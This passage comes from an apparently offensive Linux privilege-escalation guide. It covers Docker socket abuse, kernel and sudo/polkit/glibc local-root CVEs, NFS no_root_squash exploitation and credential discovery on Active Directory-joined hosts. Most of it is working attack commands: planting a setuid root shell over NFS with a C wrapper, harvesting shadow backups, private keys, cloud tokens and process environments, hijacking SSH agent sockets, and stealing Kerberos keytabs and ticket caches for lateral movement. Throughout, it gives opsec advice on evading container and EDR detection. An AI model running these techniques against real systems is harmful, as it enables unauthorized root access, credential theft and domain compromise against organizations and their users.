**Detection and opsec.** Container creation is logged by the daemon and shipped by any container-aware monitoring. A container started with `--privileged`, with `/` bind-mounted, with `--pid=host`, or with `hostNetwork` is a default high-severity alert in Falco, Tetragon, and every commercial container security product. `chroot` into a mounted host filesystem is similarly flagged. The API-over-curl route avoids the docker CLI process appearing in telemetry but does not avoid the daemon's own logging or the container lifecycle events. Cleaning up (removing the container) removes the running artefact but not the log entries. There is no quiet version of this technique, so if stealth matters, take a single action such as installing a setuid binary or writing a key, then remove the container and work from the host.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| `permission denied while trying to connect to the Docker daemon socket` | Not in the `docker` group, or the socket mode excludes you. Group membership needs a fresh login or `newgrp docker` |
| `Cannot connect to the Docker daemon` | Daemon not running, or `DOCKER_HOST` points elsewhere |
| `No such image` | No local image and no registry egress. Use `docker images` to pick one that exists, or build from a local tarball |
| Container starts and exits immediately | Your command failed. Read the logs endpoint, do not guess |
| `chroot: cannot change root directory` | The bind mount did not happen, or you are inside a user namespace that remaps root |
| Rootless podman gives a non-root host user | Expected. The rootless socket runs as its owner, so you get that user, not root |

### Kernel and userspace exploits

**When to reach for this.** Last, not first. A kernel exploit is the option when configuration review has produced nothing, and it carries a real risk of panicking the host. A userspace local-root exploit against sudo, polkit, glibc, or a setuid helper is a much better bet than a kernel one, because a failure costs you a crashed process rather than a crashed server, and because the exploits are usually far more deterministic.

#### Establishing applicability precisely

Version strings lie. Enterprise distributions backport fixes and keep the upstream version number, so "kernel 4.18 is vulnerable to X" is meaningless on RHEL 8. Do this properly:

```bash
uname -r; uname -a; cat /proc/version
# the exact package build, which is what the vendor tracker is keyed on
rpm -q kernel kernel-core 2>/dev/null
dpkg -l 'linux-image*' 2>/dev/null | grep '^ii'
cat /etc/os-release
# glibc, for the userspace loader bugs
ldd --version | head -1
getconf GNU_LIBC_VERSION
# build configuration, which decides whether a primitive even exists
grep -E 'CONFIG_(USER_NS|BPF_SYSCALL|USERFAULTFD|IO_URING|SLAB_FREELIST_HARDENED|SLAB_FREELIST_RANDOM|STATIC_USERMODEHELPER|RANDOMIZE_BASE|STRICT_DEVMEM|MODULE_SIG_FORCE|SECURITY_SELINUX|SECURITY_APPARMOR|SECURITY_LOCKDOWN_LSM)=' \
  /boot/config-$(uname -r) 2>/dev/null
zcat /proc/config.gz 2>/dev/null | grep -E 'CONFIG_(USER_NS|BPF_SYSCALL|USERFAULTFD)='
# runtime mitigations and gates
sysctl -a 2>/dev/null | grep -E 'kptr_restrict|dmesg_restrict|unprivileged_bpf|unprivileged_userfaultfd|unprivileged_userns|ptrace_scope|perf_event_paranoid|modules_disabled|kexec_load_disabled|protected_symlinks|protected_hardlinks'
cat /proc/sys/user/max_user_namespaces
cat /sys/kernel/security/lockdown 2>/dev/null
cat /sys/devices/system/cpu/vulnerabilities/* 2>/dev/null | sort -u
lsmod | head -40
```

The mitigation values are not trivia, they decide whether an exploit works at all:

| Setting | Effect on exploitation |
| --- | --- |
| `kernel.unprivileged_userns_clone=0` or `user.max_user_namespaces=0` | Kills every exploit that needs an unprivileged user namespace, which is a large fraction of modern ones |
| `kernel.unprivileged_bpf_disabled=1` or `2` | Kills unprivileged BPF-based primitives |
| `vm.unprivileged_userfaultfd=0` | Removes the userfaultfd heap-grooming primitive |
| `kernel.kptr_restrict=1` or `2` | Hides kernel pointers from `/proc/kallsyms` and `dmesg`, so KASLR must be defeated another way |
| `kernel.dmesg_restrict=1` | No kernel log for the unprivileged user, so no leak channel and no crash feedback |
| `kernel.perf_event_paranoid=3` | Blocks perf-based primitives |
| `kernel.modules_disabled=1` | Module loading is off permanently until reboot, even for root |
| `kernel.yama.ptrace_scope` | 1 restricts ptrace to descendants, 2 to CAP_SYS_PTRACE, 3 disables it |
| Lockdown `integrity` or `confidentiality` | Blocks `/dev/mem`, unsigned modules, `kexec`, and several debug interfaces even as root |
| `CONFIG_STATIC_USERMODEHELPER=y` | Breaks the extremely common "overwrite a usermode helper path" escalation technique |
| `CONFIG_SLAB_FREELIST_HARDENED`/`RANDOM` | Makes heap grooming much harder and less deterministic |

`STATIC_USERMODEHELPER` deserves a note because so many container escapes and kernel exploits rely on the usermode helper mechanism. The kernel invokes userspace binaries for certain events, and the paths are writable through `/proc/sys/kernel/modprobe`, `/proc/sys/kernel/core_pattern`, `/sys/kernel/uevent_helper`, and the cgroup v1 `release_agent`. With root in a container that has `CAP_SYS_ADMIN`, writing one of those and triggering the event runs your binary in the host's context. With that config option set, the kernel only ever calls one fixed path and the technique dies.

#### Exploit suggestion, used with judgement

```bash
./linux-exploit-suggester.sh                  # les.sh, kernel-focused, checks mitigations too
./linux-exploit-suggester-2.pl
./linpeas.sh -q | grep -iA5 'kernel exploit'
searchsploit linux kernel $(uname -r | cut -d- -f1)
```

Treat the output as a list of candidates to research, not a list of exploits to run. These tools match on version ranges and therefore produce false positives on backported distributions, which is exactly the failure mode that crashes a host.

#### The bugs that are actually worth checking

Roughly ordered by how often they still land, with the userspace ones first because they are safer:

| CVE | Component | Notes on applicability |
| --- | --- | --- |
| CVE-2021-4034 | polkit `pkexec` | Any unpatched host, any user, no preconditions. Deterministic, no crash risk. Check first |
| CVE-2021-3156 | sudo `sudoedit` | Heap overflow, root without needing any sudo rights. Reliable exploits exist per distribution |
| CVE-2023-4911 ("Looney Tunables") | glibc dynamic loader, `GLIBC_TUNABLES` | Buffer overflow processing the tunables environment variable in a setuid context. glibc 2.34 to 2.36-era builds, several distributions |
| CVE-2023-6246 | glibc `__vsyslog_internal` | Heap overflow reachable from setuid binaries that log, glibc 2.36 to 2.38 |
| CVE-2023-22809 | sudo `sudoedit` | Arbitrary file write, requires an existing `sudoedit` rule |
| CVE-2022-0847 ("Dirty Pipe") | kernel pipe buffer flags | Overwrite read-only page cache, so arbitrary write to any file you can open read-only. Kernel 5.8 up to the 5.16.11 / 5.15.25 / 5.10.102 fixes. Extremely reliable, no crash risk, works from inside containers against files on the host image |
| CVE-2024-1086 | kernel `nf_tables` double-free | Kernel 3.15 to 6.8-rc1 window. Needs `CAP_NET_ADMIN` in some user namespace, so an unprivileged userns is the usual route. Reliable public exploitation |
| CVE-2023-0386 | kernel OverlayFS | Copying a setuid file across an overlay mount preserves the bit with the wrong ownership. Needs unprivileged userns and FUSE. Very reliable where applicable |
| CVE-2023-2640, CVE-2023-32629 ("GameOver(lay)") | Ubuntu-specific OverlayFS patches | Ubuntu only, but trivially reliable on affected releases |
| CVE-2022-0185 | kernel `legacy_parse_param` | Heap overflow via filesystem context, needs unprivileged userns |
| CVE-2021-33909 ("Sequoia") | kernel `seq_file` size_t conversion | Widely applicable at the time, needs a long path and a large memory footprint |
| CVE-2021-22555 | kernel netfilter `xt_compat` | Older kernels, needs userns for the usual exploit |
| CVE-2016-5195 ("Dirty COW") | kernel COW race | Only on genuinely ancient hosts. Notorious for leaving the system unstable |

Do not take these version ranges as authority for a specific host. Resolve the distribution's package version against the vendor's own tracker.

#### Weighing the crash risk

Kernel exploitation on a production host is a decision, not a reflex. The factors:

- **What does failure cost?** A panic on a hypervisor, a database primary, a domain-joined file server, or a Kubernetes node with production workloads is an outage with your name on it. A panic on a build agent is a nuisance. Know which you are on before you fire, which is what the situational-awareness step was for.
- **How deterministic is the exploit?** A logic bug with no memory corruption (Dirty Pipe, OverlayFS setuid preservation, PwnKit) is effectively risk free. A heap-grooming use-after-free that needs to win a race is not, and a failed attempt often leaves the slab corrupted so the host panics minutes later, which is worse than an immediate crash because it looks unrelated and lands on someone else.
- **Can you test first?** Stand up an identical image, ideally the same cloud AMI or the same distribution point release with the same kernel package, and run the exploit there. This is the single highest-value thing you can do and it is routinely skipped.
- **Is there a userspace alternative?** Almost always prefer it.
- **When are you doing it?** A panic at 03:00 on a Sunday pages someone. A panic during a scheduled maintenance window is background noise. Coordinate.
- **Do you need it at all?** If you already have the objective through a configuration path, a kernel exploit adds risk and detection surface for no gain.

Also read the exploit's source before running it. Public kernel exploits frequently include a cleanup phase that matters, hardcoded offsets for one specific kernel build, and occasionally destructive behaviour. An exploit that succeeds but leaves a reference count wrong will crash the host on the next unrelated operation.

#### The container-relevant subset

From inside a container, a kernel exploit is one of the escape routes, because the kernel is shared. The relevant filter is which primitives survive the container's restrictions:

- **Dirty Pipe** works from a container against any file the container can open read-only, including files on the shared host image layers, and needs no capabilities at all.
- Anything needing an **unprivileged user namespace** requires `CONFIG_USER_NS`, a nonzero `max_user_namespaces`, and no seccomp filter blocking `unshare` and `clone` with `CLONE_NEWUSER`. Docker's default seccomp profile permits `unshare`, but many orchestrated environments tighten it, and Ubuntu 24.04 and later restrict unprivileged userns through AppArmor by default.
- Anything needing `CAP_NET_ADMIN`, `CAP_SYS_ADMIN`, or `CAP_BPF` needs it in *some* namespace, which is why the userns question dominates.
- **Seccomp** is the main blocker. Check `Seccomp: 2` in `/proc/self/status` and enumerate what is filtered by trying the syscalls, because there is no way to read the filter back.

```bash
grep -E 'Seccomp|CapBnd|NoNewPrivs' /proc/self/status
unshare -Urm /bin/sh -c id 2>&1 | head -2     # does unprivileged userns work at all
cat /proc/sys/user/max_user_namespaces
cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns 2>/dev/null
```

**Detection and opsec.** Kernel exploitation is loud in ways you cannot control. A successful exploit usually leaves kernel log entries: BUG, WARNING, general protection fault, KASAN reports, or an unusual `unshare`/`setns` sequence. `dmesg` entries are shipped by any log pipeline. Modern eBPF-based sensors specifically watch for the exploitation preambles: unprivileged `unshare(CLONE_NEWUSER)` followed by `mount`, `userfaultfd` creation, `io_uring` setup from an unusual process, `bpf()` calls from a non-root process, and writes to `core_pattern` or `release_agent`. Compiling an exploit on target with `gcc` is itself a strong signal. Dropping a binary in `/tmp` and executing it is a strong signal. The quietest form is a memory-resident exploit delivered through an existing implant, run once, with the resulting privilege used immediately to establish a quieter access path.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| Exploit compiles and runs, nothing happens, no error | Wrong kernel build. Offsets do not match. This is the common case with backported distributions |
| `unshare: Operation not permitted` | Unprivileged userns disabled by sysctl, AppArmor, or seccomp. Most modern exploits are dead |
| Segfault in the exploit itself | Wrong offsets, or a hardening feature the exploit does not account for |
| Host panics | Failed heap grooming. Nothing to do but explain it |
| Works in a VM, not on the target | Different kernel build, different CPU mitigations, different config options, or SMAP/SMEP/KPTI differences |
| `Operation not permitted` writing `/proc/sys/kernel/core_pattern` as container root | You lack `CAP_SYS_ADMIN` in the host's namespace, or `STATIC_USERMODEHELPER` is compiled in |
| Exploit needs `/proc/kallsyms` and it is empty | `kptr_restrict` is set. Needs a separate KASLR leak |

### NFS and filesystem-level escalation

#### no_root_squash

**What it is.** An NFS export with `no_root_squash` trusts the client's claim of UID 0. If you are root anywhere on the network and can mount that export, you can create files on it as root, including a setuid-root binary that you then execute on the server.

**Why it works.** NFS with `sec=sys` (the default, also called AUTH_SYS) is not authentication, it is assertion. Each request carries a UID and GID chosen by the client and the server believes them. `root_squash`, the default, is a mitigation applied server-side that rewrites incoming UID 0 to the anonymous UID. `no_root_squash` disables that mitigation, so the client's root is the server's root on that export. The setuid bit is stored in the file's mode on the server's filesystem, so a setuid binary you create over NFS is a setuid binary on the server.

**Preconditions.** An export with `no_root_squash`, network reachability to the NFS server (port 2049, plus the portmapper on 111 and the mount daemon for NFSv3), root on a machine you control, and the export mounted without `nosuid` on the server side. `sec=krb5` or `krb5p` defeats this entirely because the identity is then cryptographic.

```bash
# from the target host, what does it export
cat /etc/exports
exportfs -v 2>/dev/null
# from anywhere, what does a server export
showmount -e $TARGET
/usr/sbin/showmount -e $TARGET
rpcinfo -p $TARGET 2>/dev/null | grep -E 'nfs|mountd'
nmap -sV -p 111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs $TARGET
# what is mounted here already
findmnt -t nfs,nfs4
grep -E 'nfs' /proc/mounts
```

An export line to look for:

```text
/srv/share    10.0.0.0/24(rw,sync,no_subtree_check,no_root_squash)
```

`rw` plus `no_root_squash` is the finding. `rw` with `root_squash` is still useful if the export contains something interesting owned by a UID you can become. `insecure` in the options is a secondary finding: it permits clients to connect from source ports above 1024, which means an unprivileged process can mount it.

Exploitation, from a machine where you are root:

```bash
mkdir -p /mnt/nfs
mount -t nfs -o vers=3 $TARGET:/srv/share /mnt/nfs
# or NFSv4
mount -t nfs4 $TARGET:/srv/share /mnt/nfs
cp /bin/bash /mnt/nfs/.b
chown root:root /mnt/nfs/.b
chmod 4755 /mnt/nfs/.b
umount /mnt/nfs
# then on the target host, as your unprivileged user
/srv/share/.b -p
id
```

Use a static shell binary rather than the target's own bash if the architectures or glibc versions differ. A tiny setuid C wrapper that calls `setresuid(0,0,0)` and `execl("/bin/sh")` is more portable than copying bash, and avoids the `-p` requirement:

```bash
cat > /tmp/w.c <<'EOF'
#include <unistd.h>
int main(void){ setresuid(0,0,0); setresgid(0,0,0); execl("/bin/sh","sh",(char*)0); return 1; }
EOF
gcc -static -o /mnt/nfs/.w /tmp/w.c && chown root:root /mnt/nfs/.w && chmod 4755 /mnt/nfs/.w
```

**When you are not root on any machine**, you can still forge the UID by speaking NFS directly rather than through the kernel client. `nfsshell` and libnfs-based tools let you set the UID and GID sent in each request, which bypasses the need for local root and, with `insecure`, the need for a privileged source port. This also covers the `root_squash` but `no_all_squash` case, where UID 0 is squashed but every other UID is honoured, so you can become any non-root user on the server, which is frequently enough (become the user who owns the web root, or the user in the `sudo` group).

```bash
# libnfs utilities, URL form carries uid and gid
nfs-ls "nfs://$TARGET/srv/share?version=3&uid=0&gid=0"
nfs-cp localfile "nfs://$TARGET/srv/share/x?version=3&uid=0&gid=0"
# nfsshell interactive
nfsshell
# > host TARGET
# > export
# > mount /srv/share
# > uid 0
# > gid 0
# > put /tmp/.w
```

NFSv4 with `idmapd` maps by *name* rather than by numeric ID for some operations, which changes the picture: you may need a matching username locally rather than a matching UID. In practice most deployments run `sec=sys` with numeric IDs passed through, but if a UID-forging attempt produces files owned by `nobody`, ID mapping is why.

**Verify.** `ls -la` on the file from the target host showing `-rwsr-xr-x root root`, then executing it and checking `id`. If the mode shows without the `s`, the export or the server-side mount has `nosuid`.

#### Shared storage as a cross-host escalation path

Generalise beyond NFS. Any filesystem shared between hosts at different trust levels is a path between them, and the direction of the escalation is whichever host trusts the other's writes.

Things to look for, and what each gives you:

| Shared thing | Escalation |
| --- | --- |
| NFS-mounted home directories (very common with `autofs` and AD) | Write another user's `.bashrc`, `.profile`, `.ssh/authorized_keys`, or `.ssh/config` and take their session on any host that mounts it |
| A shared `/opt` or `/usr/local` mounted read-write on many hosts | Write a binary that every host executes, often as root |
| Backup staging shares | Read every host's filesystem, including `/etc/shadow` and keytabs, from the backup images. Also write into a restore path |
| CI artefact or cache shares (`~/.m2`, `~/.gradle`, `~/.npm`, `~/.cache/pip`, sccache) | Poison a dependency or a cached build artefact that a privileged pipeline consumes |
| Shared configuration-management trees (Ansible, Salt, Puppet checkouts) | Write a playbook, template, or module that runs as root on every managed host |
| SMB or CIFS mounts with credentials in `fstab` | The credentials themselves, plus the same write-a-profile trick |
| Container image layer stores on shared storage | Modify an image every host will run |
| `/var/lib/libvirt/images` or a VM datastore | Mount another host's disk offline and edit `/etc/shadow` or drop a key |

```bash
findmnt -t nfs,nfs4,cifs,smb3,glusterfs,ceph,fuse.sshfs
grep -vE '^\s*#' /etc/fstab | grep -E 'nfs|cifs|smb'
cat /etc/auto.master /etc/auto.* 2>/dev/null
mount | grep -E 'nfs|cifs'
# writable and not nosuid is the combination that matters
findmnt -t nfs,nfs4,cifs -o TARGET,OPTIONS | grep -v nosuid
```

**Detection and opsec.** Mounting an export is logged by the NFS server (`rpc.mountd` entries in the server's syslog for NFSv3, and connection records regardless), and creating a setuid binary on a shared filesystem is caught by any file-integrity monitoring on the server, which is common on file servers precisely because it is a known attack. `showmount -e` against a range is scan-like and will be seen. Executing a setuid binary from an NFS mount is unusual enough that some EDR rules flag it on its own. Clean up the binary. Prefer writing an SSH key into a home directory over creating a setuid binary if the objective allows it, because a new `authorized_keys` line is quieter than a new setuid file, though it is more persistent and therefore more likely to be found later.

**Failure modes.**

| Symptom | Meaning |
| --- | --- |
| `mount.nfs: access denied by server` | Your source IP is not in the export's client list, or you need a privileged source port and do not have one |
| `mount.nfs: Protocol not supported` | Version mismatch. Try `-o vers=3` or `-o vers=4.1` explicitly |
| Files appear owned by `nobody`/`nfsnobody` | `root_squash` is on, or NFSv4 ID mapping is remapping you |
| `chmod: Operation not permitted` on the setuid bit | `root_squash`, or the export is `ro`, or the server mount has `nosuid` |
| Setuid bit present but the binary runs as you | Client-side mount on the target has `nosuid`. Check `findmnt` on the target, not on your box |
| `showmount` returns nothing but 2049 is open | NFSv4 only, which has no separate mount protocol. Try mounting the pseudo-root `$TARGET:/` and listing it |
| `rpcbind: server not responding` | NFSv3 portmapper filtered. Go straight to NFSv4 on 2049 |

### Credential and key discovery, at escalation depth

The companion part owns credential harvesting properly. What follows is only the subset that escalates privilege on the host you are standing on, because credentials found locally are frequently a faster route to root than any technical primitive, and because a password reused for `sudo` turns a password-gated policy into root.

#### SSH keys and agent forwarding

```bash
find / -xdev -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' -o -name 'known_hosts' 2>/dev/null | grep -v '\.pub$'
ls -la ~/.ssh /home/*/.ssh /root/.ssh 2>/dev/null
cat ~/.ssh/config /etc/ssh/ssh_config /etc/ssh/ssh_config.d/* 2>/dev/null
grep -rEi 'BEGIN (OPENSSH|RSA|EC|DSA|ENCRYPTED) PRIVATE KEY' /home /opt /srv /var /etc 2>/dev/null | cut -d: -f1 | sort -u
# is a key passphrase protected
head -3 ~/.ssh/id_rsa
ssh-keygen -y -f ./key >/dev/null 2>&1 && echo "no passphrase" || echo "passphrase or not a key"
```

An unencrypted private key in another user's home directory that you can read is that user's access on every host trusting the key. `known_hosts` and `~/.ssh/config` tell you where the key is used, and unhashed `known_hosts` entries are a target list. `authorized_keys` entries with `command=` restrictions are worth reading because the restriction is often bypassable and the entry tells you what automation exists.

**Agent forwarding** is the higher-value finding. If a user has connected in with `ssh -A` or with `ForwardAgent yes`, there is a live agent socket on the host, and anyone who can read that socket can use their private keys without ever seeing the key material.

```bash
env | grep SSH_AUTH_SOCK
ls -la /tmp/ssh-*/agent.* 2>/dev/null
find /tmp /run -type s -name 'agent.*' -printf '%u %p\n' 2>/dev/null
# as root, or as the socket's owner, hijack it
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1234 ssh user@$TARGET
```

The socket is normally mode 0600 and owned by the forwarding user, so this is usually a *post*-root action rather than an escalation, but the socket directory permissions are sometimes wrong, and a shared service account is a common case where the socket is directly usable. The mechanism to understand is that the agent performs the signature on the operator's workstation, so a forwarded agent is a live signing oracle for as long as their session lasts, and it is unlogged from their side.

Related: `gpg-agent` sockets under `/run/user/$UID/gnupg/`, and `keyctl` session keyrings.

#### History, configuration, and environment

```bash
# every history file on the box
find / -xdev -name '.*history' -o -name '*_history' -o -name '.viminfo' -o -name '.lesshst' 2>/dev/null
cat ~/.bash_history ~/.zsh_history ~/.sh_history ~/.ash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history ~/.psql_history ~/.rediscli_history ~/.python_history ~/.node_repl_history 2>/dev/null
cat ~/.local/share/fish/fish_history 2>/dev/null
cat ~/.viminfo 2>/dev/null | head -50

# config files that hold secrets by design
cat ~/.netrc /root/.netrc ~/.pgpass ~/.my.cnf ~/.git-credentials 2>/dev/null
cat ~/.aws/credentials ~/.aws/config ~/.azure/* ~/.config/gcloud/*.json 2>/dev/null
cat ~/.docker/config.json ~/.kube/config 2>/dev/null
cat ~/.s3cfg ~/.rclone.conf ~/.config/rclone/rclone.conf 2>/dev/null
cat /etc/fstab | grep -iE 'passw|cred'
grep -rEi 'password|passwd|secret|api[_-]?key|token|BEGIN .* PRIVATE KEY' \
  /etc /opt /srv /var/www /home --include='*.conf' --include='*.cfg' --include='*.ini' \
  --include='*.yml' --include='*.yaml' --include='*.json' --include='*.xml' --include='*.env' \
  --include='*.properties' --include='*.php' --include='*.py' 2>/dev/null | head -100

# application config, ordered by how often it pays
cat /var/www/*/wp-config.php /var/www/*/.env 2>/dev/null
cat /opt/tomcat/conf/tomcat-users.xml /etc/tomcat*/tomcat-users.xml 2>/dev/null
cat /var/lib/jenkins/credentials.xml /var/lib/jenkins/secrets/* 2>/dev/null
cat /etc/gitlab/gitlab.rb /etc/gitlab/initial_root_password 2>/dev/null
cat /etc/ansible/ansible.cfg; find / -name '*vault*' -path '*ansible*' 2>/dev/null
cat /etc/salt/master /etc/puppetlabs/puppet/puppet.conf 2>/dev/null
cat /root/.rnd /etc/shadow- /etc/passwd- /etc/gshadow- 2>/dev/null   # backup copies, often mode 0644

# environment leakage from running processes
ps auxwwe | grep -iE 'pass|token|secret|key=' | grep -v grep
for p in /proc/[0-9]*; do tr '\0' '\n' < "$p/environ" 2>/dev/null; done \
  | grep -iE '^[A-Z_]*(PASS|PWD|TOKEN|SECRET|KEY|CRED)[A-Z_]*=' | sort -u
# systemd unit environment files
grep -rhE '^Environment(File)?=' /etc/systemd /usr/lib/systemd 2>/dev/null | sort -u
journalctl --no-pager 2>/dev/null | grep -iE 'password|token|secret' | head -40
```

The backup copies of the shadow database (`/etc/shadow-`, `/etc/gshadow-`, `/etc/passwd-`) are worth a specific check because they are created by `passwd` and `usermod` and their permissions are occasionally left readable, which hands you the hashes without any privilege at all.

Command lines are visible to every user through `/proc/*/cmdline`, so anything invoked with a password on the command line is readable by you right now. `ps auxww` catches the currently running set, and *pspy* catches short-lived ones, which is where backup scripts and database dumps pass credentials as arguments.

Once you have a password, always test it for reuse against `sudo`, against `su` for other local users, and against the domain if the host is joined. That last case is the subject of the next section.

### Domain-joined and enterprise Linux

**Why this matters.** A Linux host joined to Active Directory is very often the softest route into the domain, and it is routinely ignored. It holds a machine account with a keytab, it caches domain credentials for offline authentication, it keeps live Kerberos ticket caches for every logged-in user including administrators, and its sudo policy may be stored in the directory where it can be modified from the Windows side. Root on one AD-joined Linux server frequently yields domain credentials that no amount of Windows-side hardening protects, because the defensive investment is almost always on the Windows estate.

#### Determining that the host is joined, and how

```bash
realm list                                        # SSSD/realmd view of the joined domain
adcli info $DOMAIN 2>/dev/null
net ads info 2>/dev/null; net ads testjoin 2>/dev/null    # Samba/winbind join
wbinfo -u 2>/dev/null | head; wbinfo -t 2>/dev/null       # winbind trust check
klist; klist -A                                   # current ticket caches
klist -k /etc/krb5.keytab 2>/dev/null             # machine account keys
cat /etc/krb5.conf; ls -la /etc/krb5.conf.d/ 2>/dev/null
cat /etc/sssd/sssd.conf 2>/dev/null               # root only, mode 0600
ls -la /etc/sssd/conf.d/ 2>/dev/null
cat /etc/samba/smb.conf 2>/dev/null
cat /etc/nsswitch.conf                            # 'sss', 'winbind', 'ldap' in passwd/group/sudoers
grep -rE 'pam_sss|pam_winbind|pam_krb5|pam_ldap' /etc/pam.d/ 2>/dev/null
systemctl status sssd sssd-kcm winbind realmd oddjobd 2>/dev/null | head -40
id $USER@$DOMAIN 2>/dev/null; getent passwd $USER@$DOMAIN 2>/dev/null
hostname -f; dnsdomainname; cat /etc/resolv.conf
```

The five common integration models, because they change what you can steal:

| Model | Fingerprint | What is on disk |
| --- | --- | --- |
| SSSD with AD provider (the modern default, via `realm join`) | `realm list` output, `/etc/sssd/sssd.conf` with `id_provider = ad` | Machine keytab, SSSD credential cache, cached password hashes |
| SSSD with LDAP provider plus Kerberos | `id_provider = ldap`, `auth_provider = krb5` | A bind DN and password in `sssd.conf`, keytab optional |
| Samba winbind | `/etc/samba/smb.conf` with `security = ADS`, `wbinfo` works | Machine secret in `secrets.tdb`, not a keytab |
| Direct LDAP (`nslcd`, `pam_ldap`, legacy) | `/etc/nslcd.conf`, `/etc/ldap.conf`, `/etc/openldap/ldap.conf` | A bind DN and cleartext password, frequently privileged |
| Centrify, PBIS/BeyondTrust, Quest Authentication Services | `/etc/centrifydc/`, `/opt/pbis/`, `adinfo`, `/etc/opt/quest/vas/` | Vendor-specific keytabs and caches, same principles |

#### Keytabs and what they grant

**What it is.** A keytab is a file containing long-term Kerberos keys for one or more principals. Possession of a key is equivalent to possession of the password, permanently, until the key changes.

**Why it works.** Kerberos authentication proves knowledge of the principal's long-term key. A keytab stores that key in cleartext (as a derived symmetric key, but that is what the KDC checks against), so anyone who can read the file can obtain tickets as that principal without a password and without triggering a password-based logon.

```bash
# the machine account keytab
ls -la /etc/krb5.keytab
klist -k -e /etc/krb5.keytab             # -e shows encryption types
klist -Kke /etc/krb5.keytab              # -K also prints the key material
# every keytab on the host, because service keytabs are scattered
find / -xdev -name '*.keytab' -o -name 'krb5.keytab*' 2>/dev/null
find / -xdev -name '*.keytab' -perm -004 2>/dev/null      # world readable, no root needed
ls -la /var/lib/sss/keytabs/ /etc/*/keytab* /opt/*/conf/*.keytab 2>/dev/null
```

`/etc/krb5.keytab` is normally mode 0600 root-owned, so reading it is a post-root action. Service keytabs are the ones that are frequently misconfigured: Tomcat, Jenkins, Hadoop, HDFS, Kafka, Zookeeper, Elasticsearch, Nexus, and Apache with `mod_auth_gssapi` all keep keytabs in application directories owned by the application's service account, and those directories are often group readable or even world readable. A world-readable keytab for a service account is a domain credential available to any local user.

What each keytab type gives you:

| Principal type | What it grants |
| --- | --- |
| `HOST$@REALM` (machine account) | Authenticate as the computer object. Read most of the directory over LDAP, enumerate the domain, request service tickets, and if the computer is trusted for delegation or has RBCD configured, impersonate users to services. Also lets you write to attributes the computer can write, including its own `msDS-KeyCredentialLink` in some configurations |
| A service account with an SPN | Authenticate as that account. Often over-privileged, often a member of groups it should not be in, and its key does not rotate |
| A user principal in a keytab (automation) | That user's full rights, non-interactively, with no password expiry pressure |

```bash
# use a keytab to get a TGT
kinit -k -t /etc/krb5.keytab 'HOSTNAME$@REALM.COM'
kinit -kt /path/svc.keytab svc_account@REALM.COM
klist
# then use it with Kerberos-aware tooling
export KRB5CCNAME=/tmp/krb5cc_pwn
kinit -kt /path/svc.keytab svc@REALM.COM
ldapsearch -Y GSSAPI -H ldap://$DC -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName 2>/dev/null | head
nxc smb $TARGET -k --use-kcache
nxc ldap $DC -k --use-kcache
ldeep ldap -k -d $DOMAIN -s ldap://$DC all /tmp/out
bloodhound-ce-python -k -no-pass -d $DOMAIN -dc $DC -c All
```

Extracting the key material for offline use, or for use from a different host, is the more valuable operation, because it decouples you from the compromised machine. `klist -Kke` prints the keys, and `ktutil` reads and writes keytabs interactively:

```bash
klist -Kke /etc/krb5.keytab
ktutil
# ktutil:  read_kt /etc/krb5.keytab
# ktutil:  list -e -k
# ktutil:  write_kt /dev/shm/copy.keytab
# ktutil:  quit
```

The AES256 key from a machine keytab is directly usable as the `-aesKey` argument to Impacket tooling and as `--aesKey` to other Kerberos clients, which turns a Linux file read into a Windows-side authentication primitive. Remove any extracted key material from disk when you are finished.

#### Credential caches on shared hosts

**What it is.** A Kerberos credential cache (**ccache**) holds a user's TGT and service tickets for the life of the ticket. On a shared host such as a jump box, a build server, or an administrative bastion, there is a ccache for every user currently or recently logged in, and root can read all of them.

**Why it works.** A TGT is a bearer token. Whoever holds it can request service tickets as that user until it expires (default ten hours, renewable up to seven days). No password is involved, and using a stolen TGT from a different host produces authentication events attributed to the victim.

Where they live, which depends on `default_ccache_name` in `/etc/krb5.conf`:

| Cache type | Location | Notes |
| --- | --- | --- |
| `FILE:` | `/tmp/krb5cc_<uid>`, `/tmp/krb5cc_<uid>_<random>` | The classic. Readable by root, and occasionally by others through bad umask |
| `DIR:` | `/run/user/<uid>/krb5cc/` | A directory of caches with a `primary` file naming the active one |
| `KEYRING:` | Kernel keyring, not the filesystem | Not readable by simple file access, but readable by the owning user, and by root through `keyctl` in the user's session |
| `KCM:` | `sssd-kcm` daemon, backed by `/var/lib/sss/secrets/secrets.ldb` | The default on current RHEL and Fedora. Extract via the daemon or the database |

```bash
grep -E 'default_ccache_name|default_realm|dns_lookup' /etc/krb5.conf
env | grep KRB5CCNAME
ls -la /tmp/krb5cc* /run/user/*/krb5cc* 2>/dev/null
find / -xdev -name 'krb5cc*' -printf '%u %m %p\n' 2>/dev/null
klist -A                                     # all caches this user can see
klist -c /tmp/krb5cc_1001                    # a specific one
keyctl show; keyctl list @u 2>/dev/null      # KEYRING caches
ls -la /var/lib/sss/secrets/ 2>/dev/null     # KCM backing store
systemctl status sssd-kcm 2>/dev/null
```

Using a stolen ccache is direct, because the format is the same one Linux Kerberos tooling and Impacket both use:

```bash
cp /tmp/krb5cc_1001 /dev/shm/.cc
export KRB5CCNAME=/dev/shm/.cc
klist                                        # confirm the principal and expiry
nxc smb $TARGET -k --use-kcache
impacket-psexec -k -no-pass $DOMAIN/user@$TARGET
certipy req -k -no-pass -target $DC -ca 'CA-NAME' -template User
```

Converting between the Linux ccache format and the Windows `.kirbi` format is done with `impacket-ticketConverter`, which is the bridge when you want to inject a ticket into a Windows session or take one out of it:

```bash
impacket-ticketConverter /dev/shm/.cc ticket.kirbi
impacket-ticketConverter ticket.kirbi /dev/shm/.cc
```

The high-value target on an administrative jump host is a **domain administrator's ccache**. Identify whose it is before using it, because using the wrong one wastes a ten-hour window and generates events:

```bash
for c in /tmp/krb5cc_* /run/user/*/krb5cc/*; do
  echo "== $c"; KRB5CCNAME="FILE:$c" klist 2>/dev/null | head -5
done
```

#### SSSD's cached credentials

**What it is.** SSSD caches password verifiers so domain users can log in when the domain controller is unreachable. Those verifiers are crackable offline.

